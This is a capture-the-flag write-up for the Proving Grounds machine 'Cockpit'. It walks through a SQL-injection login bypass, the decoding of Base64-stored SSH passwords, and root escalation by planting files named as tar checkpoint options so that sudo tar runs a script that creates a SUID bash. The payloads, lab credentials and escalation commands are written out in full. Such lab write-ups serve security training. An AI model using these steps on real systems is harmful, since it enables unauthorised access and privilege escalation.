# Cockpit — Proving Grounds

> [!abstract] Summary
> Cockpit hosts a custom web app ("blaze") on port 80 whose `login.php` is vulnerable to a classic **SQL-injection authentication bypass** (`' OR ''='`). The bypass dumps a user table containing Base64-encoded passwords for `james` and `cameron`; decoding them yields SSH credentials. As `james`, `sudo -l` shows a passwordless `tar` with a wildcard (`*`), which is abused with GNU tar's `--checkpoint-action` option to execute a SUID-bash dropper as root.

**Target:** `192.168.143.10`

> [!note] The port 9090 "Cockpit" web service is a red herring / name pun. The intended path is the SQL-injection on the custom app served from port 80.

## Methodology

1. Scan all TCP ports; identify the web app on 80 and the Cockpit service on 9090.
2. Directory-brute the web root and find `login.php`.
3. Bypass authentication with SQL injection and recover Base64 user credentials.
4. Decode and SSH in as `james`.
5. Escalate via a `sudo` `tar *` wildcard-injection to root.

## Exploitation — SQL injection authentication bypass

The login form is injectable. A tautology in the username with an empty password logs us straight in:

```
username : 'OR '' = ' 
password : leave empty
```

Once authenticated, the application exposes a user table with Base64-encoded passwords:

```
Username 	Password
james 	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron 	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

Decoding the Base64 blobs (`echo <b64> | base64 -d`) gives the plaintext passwords:

```
james
canttouchhhthiss@455152

cameron
thisscanttbetouchedd@455152
```

## Initial access — SSH as james

The decoded credential works over SSH:

```
ssh james@192.168.143.10
```

This lands a shell as `james` with the local flag.

## Privilege escalation — `sudo tar` wildcard injection

`sudo -l` as `james` shows a passwordless `tar` that archives with a wildcard:

The relevant sudo entry is:
```
/usr/bin/tar -czvf /tmp/backup.tar.gz *
```

> [!info] Why the wildcard is dangerous
> When the shell expands `*` in the backup directory, any filenames beginning with `--` are handed to `tar` as **command-line options**. GNU tar supports `--checkpoint=1` (act after each record) and `--checkpoint-action=exec=...` (run a command at each checkpoint). By creating files whose names are those options, we make root's `tar` execute our script.

Run the following from the directory where the wildcard archive is created (adjust the username and archive name to match the sudo entry):
```
cd /home/<YOUR USERNAME> 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh  
chmod +x runme.sh  
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh runme.sh'  
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *  
/tmp/bash -p  
id
```

The `runme.sh` script copies `/bin/bash` to `/tmp/bash` and sets the SUID bit on it. When the root `sudo tar ... *` runs, the two specially-named files are interpreted as `--checkpoint` options and `runme.sh` executes as root. Finally `/tmp/bash -p` spawns a shell that keeps the elevated effective UID (`euid=0`), and `id` confirms root.

## Lessons learned

- The most obvious service is not always the path — the port 9090 **Cockpit** service shares the box's name but is a decoy. The intended foothold is the custom PHP app on 80.
- Always test login forms for SQL-injection auth bypass (`' OR ''='`) before brute-forcing. A successful bypass here also leaked credentials, giving a cleaner SSH foothold than the web shell.
- Base64 is encoding, not encryption — decode "password"-looking blobs immediately.
- A `sudo` command that runs `tar` (or `zip`, `rsync`, `7z`) over a **wildcard** is a wildcard-injection privesc. `--checkpoint-action=exec=` is the canonical tar technique.
